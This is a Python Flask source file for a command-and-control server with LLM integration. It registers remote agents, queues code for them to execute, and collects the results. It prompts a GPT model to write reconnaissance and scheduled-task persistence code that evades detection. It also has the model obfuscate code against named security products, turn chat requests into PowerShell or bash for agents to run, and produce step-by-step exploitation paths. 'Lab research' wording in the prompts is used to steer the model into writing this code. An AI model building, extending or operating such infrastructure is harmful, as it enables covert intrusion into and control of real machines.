#!/usr/bin/env python3
# app.py - Enhanced C2 server with LLM integration
from flask import Flask, request, jsonify, render_template
import os
import json
import uuid
import requests
import time
import traceback
import sys
import re
import logging.handlers
from datetime import datetime, timedelta

# Import configuration
try:
    from config import *
except ImportError:
    # Fallback configuration
    DEBUG = False
    PORT = 5000
    HOST = "0.0.0.0"
    OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "your-api-key")
    MAX_HISTORY_ITEMS = 1000
    MAX_RESULT_SIZE = 10 * 1024 * 1024  # 10MB

app = Flask(__name__)
app.secret_key = SECRET_KEY if 'SECRET_KEY' in locals() else os.urandom(24)

# Setup logging
def setup_logging():
    """Configure rotating file logs"""
    log_formatter = logging.Formatter(LOG_FORMAT if 'LOG_FORMAT' in locals() 
                                      else '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    
    # File handler with rotation
    file_handler = logging.handlers.RotatingFileHandler(
        LOG_FILE if 'LOG_FILE' in locals() else 'server.log', 
        maxBytes=LOG_MAX_BYTES if 'LOG_MAX_BYTES' in locals() else 10*1024*1024, 
        backupCount=LOG_BACKUP_COUNT if 'LOG_BACKUP_COUNT' in locals() else 5)
    file_handler.setFormatter(log_formatter)
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(log_formatter)
    
    # Root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(getattr(logging, LOG_LEVEL) if 'LOG_LEVEL' in locals() else logging.INFO)
    root_logger.addHandler(file_handler)
    root_logger.addHandler(console_handler)
    
    return root_logger

logger = setup_logging()
logger.info("Server starting up")

# Ensure scripts directory exists and contains necessary scripts
def ensure_scripts_directory():
    """Ensure scripts directory exists and contains necessary scripts"""
    scripts_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scripts")
    os.makedirs(scripts_dir, exist_ok=True)
    
    # Basic placeholder for WinPEAS - replace with actual script content
    winpeas_path = os.path.join(scripts_dir, "winpeas.bat")
    if not os.path.exists(winpeas_path):
        with open(winpeas_path, 'w') as f:
            f.write('@echo off\necho WinPEAS Security Analysis\necho ========================\n')
            f.write('systeminfo\necho.\necho User Information:\nnet user\necho.\n')
            f.write('echo Running Services:\nnet start\necho.\necho.\necho Analysis complete.\n')
    
    # Basic placeholder for LinPEAS - replace with actual script content
    linpeas_path = os.path.join(scripts_dir, "linpeas.sh")
    if not os.path.exists(linpeas_path):
        with open(linpeas_path, 'w') as f:
            f.write('#!/bin/bash\necho "LinPEAS Security Analysis"\necho "========================"\n')
            f.write('uname -a\necho "User Information:"\nwhoami\nid\necho "Running Processes:"\nps aux\necho "Analysis complete."\n')

# Call ensure_scripts_directory during startup
ensure_scripts_directory()

# In-memory storage (use a database for persistent storage)
agents = {}
tasks = {}
results = {}
agent_conversations = {}  # Store conversation history by conversation ID

# Data cleanup function
def clean_old_data():
    """Remove oldest data when storage exceeds limits"""
    global agents, tasks, results
    
    # Clean agent data
    if len(agents) > MAX_HISTORY_ITEMS:
        sorted_agents = sorted(agents.keys(), 
                              key=lambda k: datetime.fromisoformat(agents[k].get('last_seen', '2000-01-01')))
        for agent_id in sorted_agents[:100]:  # Remove 100 oldest
            del agents[agent_id]
    
    # Clean tasks data
    if len(tasks) > MAX_HISTORY_ITEMS:
        sorted_tasks = sorted(tasks.keys(), 
                             key=lambda k: datetime.fromisoformat(tasks[k].get('created_at', '2000-01-01')))
        for task_id in sorted_tasks[:100]:
            del tasks[task_id]
    
    # Clean results data
    if len(results) > MAX_HISTORY_ITEMS:
        sorted_results = sorted(results.keys(), 
                               key=lambda k: results[k].get('timestamp', '2000-01-01'))
        for result_id in sorted_results[:100]:
            del results[result_id]

# Context processor for template variables
@app.context_processor
def inject_now():
    return {
        "now": datetime.now(),
        "is_agent_active": lambda timestamp: (datetime.now() - datetime.fromisoformat(timestamp)).total_seconds() < 300 if isinstance(timestamp, str) else False
    }

# Mock code generation when no API key is available
def mock_generate_code(task_type, environment_details):
    """Generate mock code when OpenAI API key is not available"""
    mock_code = {
        "recon": """
def main():
    import os
    import platform
    import socket
    import json
    
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "username": os.getlogin(),
        "python_version": platform.python_version(),
        "security_products": """ + json.dumps(environment_details.get("security_products", [])) + """
    }
    
    return info
""",
        "persistence": """
def main():
    import os
    import tempfile
    import random
    
    # Create a benign test file for demo purposes
    test_file = os.path.join(tempfile.gettempdir(), f"test_{random.randint(1000, 9999)}.txt")
    with open(test_file, "w") as f:
        f.write("This is a test file created by the research agent")
    
    return {"status": "File created for testing", "path": test_file}
"""
    }
    
    return mock_code.get(task_type, mock_code["recon"])

# LLM Code Generation (used if API key is available)
def generate_code(task_type, environment_details):
    """Generate Python code based on task type and target environment"""
    try:
        # This function requires the OpenAI library and API key
        import openai
        openai.api_key = OPENAI_API_KEY
        
        # Build the prompt based on task type
        prompts = {
            "recon": f"""
                Write a Python function named 'main' that:
                1. Collects basic system information (hostname, username)
                2. Identifies installed applications
                3. Returns the information as a formatted string
                
                Target environment has these security products: {environment_details.get("security_products", [])}
                Make the code evade detection while performing only the specified actions.
                Use only standard library modules.
            """,
            "persistence": f"""
                Write a Python function named 'main' that:
                1. Creates a persistence mechanism using scheduled tasks
                2. Ensures the current script runs at startup
                3. Returns success/failure status
                
                Target environment has these security products: {environment_details.get("security_products", [])}
                Make the code evade detection. Use only standard library modules.
            """,
            # Add more task types as needed
        }
        
        prompt = prompts.get(task_type, prompts["recon"])
        
        # Call OpenAI API
        response = openai.ChatCompletion.create(
            model=OPENAI_MODEL if 'OPENAI_MODEL' in locals() else "gpt-4",
            messages=[
                {"role": "system", "content": "You are generating Python code for security research in an isolated lab environment. The code should demonstrate evasion techniques without causing actual damage."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7
        )
        
        return response.choices[0].message["content"]
    except Exception as e:
        # If any error occurs, fall back to mock code
        logger.error(f"Error using OpenAI API: {str(e)}")
        return mock_generate_code(task_type, environment_details)

# Handle conversation message and generate code
def handle_conversation(agent_id, message, conversation_history=None):
    """Process a conversation message and return code to execute"""
    if conversation_history is None:
        conversation_history = []
    
    try:
        # Add user message to history
        conversation_history.append({"role": "user", "content": message})
        
        # Get agent environment for context
        agent_environment = {}
        for result in results.values():
            if result.get("agent_id") == agent_id and result.get("task_id") == "init":
                agent_environment = result.get("data", {})
        
        # Check if we have API key
        if not OPENAI_API_KEY or OPENAI_API_KEY == "your-api-key":
            # Use mock response for testing
            ai_response = f"I'll generate code to help with that. Here's a simple implementation:\n\n```python\ndef main():\n    import os\n    return 'This is a mock response since API key is not configured'\n```"
            conversation_history.append({"role": "assistant", "content": ai_response})
            
            code = "def main():\n    import os\n    return 'This is a mock response since API key is not configured'"
            
        else:
            import openai
            openai.api_key = OPENAI_API_KEY
            
            # Prepare system prompt
            system_prompt = f"""You are an AI assistant that generates Python code for a security research agent.
You receive instructions in natural language and convert them to working Python code.
The code should use a main() function that returns results.
Environment details: {json.dumps(agent_environment)}
"""
            
            # Call OpenAI API with conversation history
            response = openai.ChatCompletion.create(
                model=OPENAI_MODEL if 'OPENAI_MODEL' in locals() else "gpt-4",
                messages=[
                    {"role": "system", "content": system_prompt},
                    *conversation_history
                ],
                temperature=0.7
            )
            
            # Get AI response
            ai_response = response.choices[0].message["content"]
            conversation_history.append({"role": "assistant", "content": ai_response})
            
            # Extract code from response
            import re
            code_match = re.search(r"```python(.*?)```", ai_response, re.DOTALL)
            
            if code_match:
                code = code_match.group(1).strip()
            else:
                # If no code block, wrap the response in a function
                code = f"def main():\n    return \"\"\"\n{ai_response}\n\"\"\""
    
    except Exception as e:
        # Handle errors
        error_msg = f"Error processing conversation: {str(e)}"
        logger.error(f"Conversation error: {traceback.format_exc()}")
        ai_response = error_msg
        code = f"def main():\n    return \"{error_msg}\""
        conversation_history.append({"role": "assistant", "content": error_msg})
    
    return {
        "code": code,
        "conversation": conversation_history,
        "response": ai_response
    }

# Code obfuscation function - UPDATED
def obfuscate_code(code, language="python", target_security="generic"):
    """Use LLM to obfuscate code for evasion"""
    try:
        if not OPENAI_API_KEY or OPENAI_API_KEY == "your-api-key":
            # Mock obfuscation for testing
            obfuscated = f"# Obfuscated version (mock)\n\n{code}\n\n# Note: This is just the original code\n# Real obfuscation requires API key"
            explanation = "API key not configured. This would normally use AI to obfuscate the code."
        else:
            import openai
            openai.api_key = OPENAI_API_KEY
            
            # Modified prompt that explicitly preserves the main() function
            prompt = f"""Obfuscate the following {language} code to evade detection by {target_security}.
Apply advanced obfuscation techniques while preserving the exact functionality.
IMPORTANT: You MUST preserve the function name 'main()' exactly as is, but obfuscate everything else.
The agent specifically looks for a function named 'main()' to execute the code.
Explain the techniques used in comments.

Original code:
```{language}
{code}
```"""
            
            # Call the LLM
            response = openai.ChatCompletion.create(
                model=OPENAI_MODEL if 'OPENAI_MODEL' in locals() else "gpt-4",
                messages=[
                    {"role": "system", "content": "You are an expert in code obfuscation techniques that can transform code to evade security product detection."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.7,
                max_tokens=4000
            )
            
            # Extract the obfuscated code
            ai_response = response.choices[0].message["content"]
            
            # Find the code block in the response using regex
            import re
            code_pattern = r"```(?:\w+)?\s*(.*?)```"
            code_match = re.search(code_pattern, ai_response, re.DOTALL)
            
            obfuscated = code_match.group(1) if code_match else ai_response
            explanation = ai_response
            
            # Safety check - verify main() function exists
            if "def main(" not in obfuscated and language.lower() == "python":
                logger.warning("Obfuscated code missing main() function - adding fallback wrapper")
                # Add fallback wrapper that preserves the entry point
                obfuscated = obfuscated + """

# Fallback wrapper to ensure main() function exists
def main():
    # Find the likely entry point function (first function defined)
    import sys, inspect
    for name, obj in inspect.getmembers(sys.modules[__name__]):
        if inspect.isfunction(obj) and name != 'main':
            return obj()
    return "Error: No entry point found in obfuscated code"
"""
                explanation += "\n\nNOTE: Added fallback main() function wrapper to ensure compatibility with agent execution system."
            
    except Exception as e:
        logger.error(f"Obfuscation error: {traceback.format_exc()}")
        obfuscated = code
        explanation = f"Error during obfuscation: {str(e)}"
    
    return {
        "obfuscated_code": obfuscated,
        "explanation": explanation
    }

def analyze_execution_result(result_data, original_message):
    """Analyze execution results and provide insights"""
    
    # Extract result components
    output = result_data.get("output", "")
    stdout = result_data.get("stdout", "")
    stderr = result_data.get("stderr", "")
    error = result_data.get("error", "")
    exit_code = result_data.get("exit_code", 0)
    
    # If we have OpenAI API available, use it for analysis
    if OPENAI_API_KEY and OPENAI_API_KEY != "your-api-key":
        try:
            import openai
            openai.api_key = OPENAI_API_KEY
            
            # Create analysis prompt
            prompt = f"""
User requested: "{original_message}"

Execution results:
- stdout: {stdout or output or 'No output'}
- stderr: {stderr or 'No errors'}
- error: {error or 'No execution error'}
- exit_code: {exit_code}

Analyze these results in relation to the user's request. Provide a concise, helpful explanation of what happened.
Focus on whether the request was fulfilled successfully and explain any errors or unexpected results.
"""
            
            response = openai.ChatCompletion.create(
                model=OPENAI_MODEL if 'OPENAI_MODEL' in locals() else "gpt-4",
                messages=[
                    {"role": "system", "content": "You are an expert system analyst helping interpret command execution results."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3,
                max_tokens=500
            )
            
            return response.choices[0].message["content"]
            
        except Exception as e:
            logger.error(f"Analysis error: {traceback.format_exc()}")
            # Fall back to basic analysis
            return f"Your request has been executed. Results are shown above."
    else:
        # Basic analysis without AI
        if error or (stderr and stderr.strip()):
            return "The execution encountered some errors, shown above."
        else:
            return "Your request has been executed successfully. Results are shown above."

# Routes

@app.route('/')
def index():
    """Admin interface"""
    return render_template('index.html', 
                          agents=agents, 
                          tasks=tasks,
                          results=results)

@app.route('/scripts/<script_name>', methods=['GET'])
def get_script(script_name):
    """Endpoint for agents to download analysis scripts"""
    scripts_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scripts")
    
    # Validate script_name to prevent path traversal
    if '..' in script_name or '/' in script_name or '\\' in script_name:
        return jsonify({"status": "error", "message": "Invalid script name"}), 400
        
    script_path = os.path.join(scripts_dir, script_name)
    if not os.path.exists(script_path):
        return jsonify({"status": "error", "message": "Script not found"}), 404
        
    with open(script_path, 'r') as f:
        script_content = f.read()
        
    return jsonify({
        "status": "success",
        "script": script_content
    })

@app.route('/tasks', methods=['GET'])
def get_tasks():
    """Endpoint for agents to check for tasks"""
    agent_id = request.args.get('agent')
    
    if not agent_id:
        return jsonify({"status": "error", "message": "Missing agent ID"}), 400
    
    try:
        # Register/update agent if needed
        if agent_id not in agents:
            agents[agent_id] = {
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
            }
        else:
            agents[agent_id]["last_seen"] = datetime.now().isoformat()
        
        # Check for pending tasks
        pending_tasks = [t for t in tasks.values() 
                        if t.get("agent_id") == agent_id and 
                        t.get("status") == "pending"]
        
        if pending_tasks:
            task = pending_tasks[0]
            task["status"] = "sent"
            return jsonify({
                "status": "task_available",
                "task": task
            })
        
        # Clean old data occasionally
        if random.random() < 0.05:  # ~5% chance on each request
            clean_old_data()
            
        return jsonify({"status": "no_tasks"})
        
    except Exception as e:
        logger.error(f"Error in get_tasks: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/results', methods=['POST'])
def post_results():
    """Endpoint for agents to submit task results"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        task_id = data.get("task_id")
        result = data.get("result")
        
        # Validate data
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        if not task_id:
            return jsonify({"status": "error", "message": "Missing task_id"}), 400
        if result is None:
            return jsonify({"status": "error", "message": "Missing result"}), 400
            
        # Check result size (avoid memory issues)
        result_size = len(json.dumps(result))
        if result_size > MAX_RESULT_SIZE:
            logger.warning(f"Result too large: {result_size} bytes")
            return jsonify({"status": "error", "message": "Result too large"}), 400
        
        # Store result
        result_id = str(uuid.uuid4())
        results[result_id] = {
            "agent_id": agent_id,
            "task_id": task_id,
            "data": result,
            "timestamp": datetime.now().isoformat()
        }
        
        # Update task status if applicable
        if task_id in tasks:
            tasks[task_id]["status"] = "completed"
            
            # If this is a conversation task, perform analysis
            if tasks[task_id].get("conversation_id") and tasks[task_id].get("task_type") == "conversation":
                # The analysis will be handled by the chat endpoint's polling mechanism
                pass
        
        # Cleanup occasionally
        if len(results) > MAX_HISTORY_ITEMS * 0.9:  # 90% threshold
            clean_old_data()
            
        # Add debug print for security analysis tasks
        if task_id and task_id.startswith("security_analysis_"):
            print(f"\n=== SECURITY ANALYSIS RESULTS ===")
            print(f"Task ID: {task_id}")
            print(f"Agent ID: {agent_id}")
            if isinstance(result, dict) and "summary" in result:
                print("\nSummary of findings:")
                for item in result.get("summary", []):
                    print(f"- {item}")
            print("===========================\n")
            
        return jsonify({"status": "result_received"})
    
    except Exception as e:
        logger.error(f"Error in post_results: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/create_task', methods=['POST'])
def create_task():
    """Admin endpoint to create new tasks"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        task_type = data.get("task_type")
        custom_code = data.get("custom_code")
        
        # Validate data
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        if not task_type:
            return jsonify({"status": "error", "message": "Missing task_type"}), 400
        
        # Use custom code if provided
        if task_type == "custom" and custom_code:
            code = custom_code
        else:
            # Get agent environment details
            agent_environment = {}
            for result in results.values():
                if result.get("agent_id") == agent_id and result.get("task_id") == "init":
                    agent_environment = result.get("data", {})
            
            # Use mock code generator if API key not available
            if not OPENAI_API_KEY or OPENAI_API_KEY == "your-api-key":
                code = mock_generate_code(task_type, agent_environment)
            else:
                # Generate code using LLM
                code = generate_code(task_type, agent_environment)
        
        # Create task
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": task_type,
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        
        return jsonify({
            "status": "task_created",
            "task_id": task_id
        })
    
    except Exception as e:
        logger.error(f"Error in create_task: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/create_security_analysis', methods=['POST'])
def create_security_analysis():
    """Create a security analysis task for an agent"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
            
        # Create task
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": "security_analysis",  # Special type the agent recognizes
            "code": "",  # No code needed - agent will use built-in function
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        
        return jsonify({
            "status": "task_created",
            "task_id": task_id
        })
        
    except Exception as e:
        logger.error(f"Error creating security analysis task: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

# UPDATED: Modified to handle execution_type
@app.route('/chat', methods=['POST'])
def chat_message():
    """Process a chat message, create a task, and return execution results"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        message = data.get("message")
        conversation_id = data.get("conversation_id")
        execution_type = data.get("execution_type", "python")  # New parameter for language selection
        
        # Validate data
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        if not message:
            return jsonify({"status": "error", "message": "Missing message"}), 400
        
        # Get or create conversation history
        conversation_history = agent_conversations.get(conversation_id, [])
        
        # Add language info to message for the AI
        enhanced_message = f"Generate {execution_type} code for: {message}"
        
        # Process the message and generate code
        result = handle_conversation(agent_id, enhanced_message, conversation_history)
        
        # Modify code based on execution_type
        code = result["code"]
        if execution_type == "powershell":
            if not code.startswith("#ps"):
                code = "#ps\n" + code
        elif execution_type == "bash":
            if not code.startswith("#bash"):
                code = "#bash\n" + code
        
        # Save updated conversation
        if not conversation_id:
            conversation_id = f"conv-{uuid.uuid4()}"
        agent_conversations[conversation_id] = result["conversation"]
        
        # Create a task from the generated code
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": "conversation",
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "conversation_id": conversation_id,
            "original_message": message,
            "execution_type": execution_type  # Store the execution type
        }
        
        # Set a reasonable timeout (30 seconds)
        timeout_seconds = 30
        start_time = datetime.now()
        execution_result = None
        
        try:
            # Wait for the agent to pick up and execute the task
            while (datetime.now() - start_time).total_seconds() < timeout_seconds:
                # Check if we have a result for this task
                for result_id, result_data in results.items():
                    if result_data.get("task_id") == task_id:
                        execution_result = result_data
                        break
                
                if execution_result:
                    break
                    
                # Sleep briefly before checking again
                time.sleep(0.5)
        except Exception as wait_error:
            logger.error(f"Error waiting for task execution: {str(wait_error)}")
        
        # Update the conversation with execution results
        if execution_result:
            # Format the result for conversation
            result_data = execution_result.get("data", {})
            
            # Extract relevant information from the result
            output = result_data.get("output", "")
            stdout = result_data.get("stdout", "")
            stderr = result_data.get("stderr", "")
            error = result_data.get("error", "")
            executed_as = result_data.get("executed_as", "unknown")
            
            # Build a readable result message
            execution_message = "I've executed your request. Here are the results:\n\n"
            
            if output:
                execution_message += f"```\n{output}\n```\n"
            elif stdout:
                execution_message += f"```\n{stdout}\n```\n"
            
            if stderr and stderr.strip():
                execution_message += f"\nErrors/Warnings:\n```\n{stderr}\n```\n"
            
            if error:
                execution_message += f"\nError encountered:\n```\n{error}\n```\n"
                
            execution_message += f"\n_Executed as: {executed_as}_"
            
            # Add execution result to conversation history
            agent_conversations[conversation_id].append({
                "role": "assistant", 
                "content": execution_message
            })
            
            # Mark task as analyzed
            tasks[task_id]["status"] = "analyzed"
        else:
            # Timeout occurred
            timeout_message = "I generated code based on your request, but I haven't received execution results yet. The agent might be busy or offline."
            agent_conversations[conversation_id].append({
                "role": "assistant", 
                "content": timeout_message
            })
        
        # Determine the response to send back
        final_response = execution_message if execution_result else result["response"]
        
        return jsonify({
            "status": "message_processed",
            "conversation_id": conversation_id,
            "task_id": task_id,
            "ai_response": final_response,
            "execution_completed": execution_result is not None
        })
        
    except Exception as e:
        logger.error(f"Error in chat_message: {traceback.format_exc()}")
        return jsonify({
            "status": "error", 
            "message": str(e)
        }), 500

# NEW: Added endpoint to get task details
@app.route('/get_task/<task_id>', methods=['GET'])
def get_task(task_id):
    """Get details of a specific task"""
    if task_id in tasks:
        task_data = tasks[task_id]
        # Return safe copy without internal fields
        return jsonify({
            "id": task_data.get("id"),
            "agent_id": task_data.get("agent_id"),
            "task_type": task_data.get("task_type"),
            "code": task_data.get("code"),
            "status": task_data.get("status"),
            "created_at": task_data.get("created_at")
        })
    else:
        return jsonify({"status": "error", "message": "Task not found"}), 404

@app.route('/obfuscate_code', methods=['POST'])
def obfuscate_code_endpoint():
    """Endpoint to obfuscate code using LLM"""
    try:
        data = request.json
        code = data.get("code")
        language = data.get("language", "python")
        target_security = data.get("target_security", "generic")
        
        if not code:
            return jsonify({"status": "error", "message": "No code provided"}), 400
        
        # Call obfuscation function
        result = obfuscate_code(code, language, target_security)
        
        return jsonify({
            "status": "success",
            "original_code": code,
            "obfuscated_code": result["obfuscated_code"],
            "explanation": result["explanation"]
        })
        
    except Exception as e:
        logger.error(f"Error in obfuscate_code: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

# UPDATED: Modified for advanced analysis script download
@app.route('/analyze_attack_paths', methods=['POST'])
def analyze_attack_paths():
    """Analyze potential attack paths based on reconnaissance data"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        analysis_type = data.get("analysis_type", "basic")  # "basic" or "advanced"
        
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        
        # If advanced analysis requested, create a security analysis task
        if analysis_type == "advanced":
            # Create task with explicit command for advanced analysis
            task_id = str(uuid.uuid4())
            tasks[task_id] = {
                "id": task_id,
                "agent_id": agent_id,
                "task_type": "security_analysis",
                "code": """# Command to download and execute appropriate script
def main():
    import platform
    if platform.system().lower() == 'windows':
        script_name = 'winpeas.bat'
    else:
        script_name = 'linpeas.sh'
    
    # Import function dynamically to avoid reference issues
    from __main__ import fetch_and_run_analysis_script
    return fetch_and_run_analysis_script(script_name)
""",
                "status": "pending",
                "created_at": datetime.now().isoformat(),
                "command": "download and execute winpeas from /scripts"  # Special command flag
            }
            
            logger.info(f"Created advanced security analysis task {task_id} for agent {agent_id}")
            
            return jsonify({
                "status": "analysis_initiated",
                "message": "Advanced security analysis task created. This can take several minutes. Check results shortly.",
                "task_id": task_id,
                "analysis_type": "advanced"
            })
        
        # Otherwise perform the original basic analysis
        else:
            # Get all reconnaissance data for this agent
            recon_data = {}
            for result in results.values():
                if result.get("agent_id") == agent_id:
                    recon_data.update(result.get("data", {}))
            
            # Mock analysis if no API key
            if not OPENAI_API_KEY or OPENAI_API_KEY == "your-api-key":
                analysis = "API key not configured. This would normally provide AI analysis of attack paths."
            else:
                # Ask LLM to analyze attack paths
                import openai
                openai.api_key = OPENAI_API_KEY
                
                system_prompt = """You are a security research assistant analyzing a system for potential attack paths. 
    Based on the reconnaissance data, identify vulnerabilities and suggest specific techniques that could 
    be used in a controlled research environment to test security product detection capabilities. 
    For each suggestion, provide:
    1. The attack technique name and MITRE ATT&CK tactic
    2. Why this would be effective in this environment
    3. How it might evade the detected security products
    4. A high-level implementation approach"""
                
                response = openai.ChatCompletion.create(
                    model=OPENAI_MODEL if 'OPENAI_MODEL' in locals() else "gpt-4",
                    messages=[
                        {"role": "system", "content": system_prompt},
                        {"role": "user", "content": f"Analyze this system reconnaissance data and suggest attack paths: {json.dumps(recon_data)}"}
                    ],
                    temperature=0.7
                )
                
                analysis = response.choices[0].message["content"]
            
            # Store analysis as a special result
            result_id = str(uuid.uuid4())
            results[result_id] = {
                "agent_id": agent_id,
                "task_id": "attack_path_analysis",
                "data": {
                    "analysis": analysis,
                    "timestamp": datetime.now().isoformat(),
                    "analysis_type": "basic"
                }
            }
            
            return jsonify({
                "status": "analysis_complete",
                "result_id": result_id,
                "analysis": analysis,
                "analysis_type": "basic"
            })
            
    except Exception as e:
        logger.error(f"Error in analyze_attack_paths: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/check_analysis_status/<task_id>', methods=['GET'])
def check_analysis_status(task_id):
    """Check status of advanced security analysis and provide AI interpretation of results"""
    try:
        # Look for the task status
        if task_id in tasks:
            task_status = tasks[task_id].get("status")
            
            # If completed, look for results and add AI analysis
            if task_status == "completed":
                # Find results for this task
                result_found = None
                result_id = None
                
                for r_id, result_data in results.items():
                    if result_data.get("task_id") == task_id:
                        result_found = result_data
                        result_id = r_id
                        break
                
                if result_found:
                    # Check if we've already done AI analysis
                    if "ai_analysis" not in result_found.get("data", {}):
                        # Get scan data to send to AI
                        scan_data = result_found.get("data", {})
                        
                        # Generate AI analysis if we have API key
                        if OPENAI_API_KEY and OPENAI_API_KEY != "your-api-key":
                            try:
                                import openai
                                openai.api_key = OPENAI_API_KEY
                                
                                # Prepare data for AI - focus on relevant parts
                                analysis_input = {
                                    "summary": scan_data.get("summary", []),
                                    "categories": scan_data.get("categories", {}),
                                    "system_info": scan_data.get("system_info", {})
                                }
                                
                                # Create comprehensive analysis prompt
                                system_prompt = """You are an expert penetration tester analyzing the output of 
                                LinPEAS/WinPEAS security scans. Based on the detailed findings, identify:
                                
                                1. The most critical security vulnerabilities and misconfigurations
                                2. Specific, actionable attack paths that could be exploited
                                3. For each attack path, provide:
                                   - The MITRE ATT&CK techniques involved
                                   - Step-by-step exploitation approach
                                   - Required tools and commands
                                   - Estimated likelihood of success
                                
                                Format your response with clear headings and prioritize findings by severity.
                                This is for authorized security testing only."""
                                
                                # Call AI for analysis
                                response = openai.ChatCompletion.create(
                                    model=OPENAI_MODEL if 'OPENAI_MODEL' in locals() else "gpt-4",
                                    messages=[
                                        {"role": "system", "content": system_prompt},
                                        {"role": "user", "content": f"Analyze these security scan results and provide detailed attack path recommendations: {json.dumps(analysis_input)}"}
                                    ],
                                    temperature=0.7
                                )
                                
                                # Store the AI analysis in the result
                                ai_analysis = response.choices[0].message["content"]
                                
                                # Add AI analysis to stored results
                                result_found["data"]["ai_analysis"] = ai_analysis
                                results[result_id] = result_found
                                
                            except Exception as e:
                                logger.error(f"Error generating AI analysis: {traceback.format_exc()}")
                                result_found["data"]["ai_analysis"] = f"Error generating AI analysis: {str(e)}"
                                results[result_id] = result_found
                        else:
                            result_found["data"]["ai_analysis"] = "OpenAI API key not configured. Cannot generate AI analysis of security scan results."
                            results[result_id] = result_found
                    
                    # Return the analysis results with AI interpretation
                    return jsonify({
                        "status": "completed",
                        "result_id": result_id,
                        "analysis": result_found.get("data", {})
                    })
                
                # If no results found but task completed
                return jsonify({
                    "status": "pending",
                    "message": "Task completed but results not found yet"
                })
            else:
                # Task still pending
                return jsonify({
                    "status": "pending", 
                    "message": f"Analysis in progress, status: {task_status}"
                })
        else:
            # Task not found
            return jsonify({
                "status": "error",
                "message": "Analysis task not found"
            }), 404
            
    except Exception as e:
        logger.error(f"Error checking analysis status: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Add a test endpoint for debugging
@app.route('/test_task', methods=['POST'])
def test_task():
    """Test endpoint to create mock tasks"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        task_type = data.get("task_type", "recon")
        
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        
        # Create task with mock code
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": task_type,
            "code": mock_generate_code(task_type, {}),
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        
        return jsonify({
            "status": "task_created",
            "task_id": task_id
        })
        
    except Exception as e:
        logger.error(f"Error in test_task: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Add health check endpoint
@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for monitoring"""
    try:
        return jsonify({
            "status": "healthy",
            "timestamp": datetime.now().isoformat(),
            "agents": len(agents),
            "tasks": len(tasks),
            "results": len(results)
        })
    except Exception as e:
        logger.error(f"Health check failed: {str(e)}")
        return jsonify({"status": "unhealthy", "error": str(e)}), 500

# Add this endpoint to view security analysis results for debugging
@app.route('/view_analysis/<task_id>', methods=['GET'])
def view_analysis(task_id):
    """Temporary endpoint to view security analysis results"""
    found_results = []
    for result_id, result_data in results.items():
        if result_data.get("task_id") == task_id:
            found_results.append(result_data)
    
    return jsonify({
        "task_id": task_id,
        "results_count": len(found_results),
        "results": found_results
    })

if __name__ == "__main__":
    # Import random here to avoid circular imports
    import random
    
    # Log startup info
    logger.info(f"Starting server on {HOST}:{PORT}")
    logger.info(f"Debug mode: {DEBUG}")
    logger.info(f"OpenAI API configured: {OPENAI_API_KEY != 'your-api-key'}")
    
    app.run(debug=DEBUG, host=HOST, port=PORT)
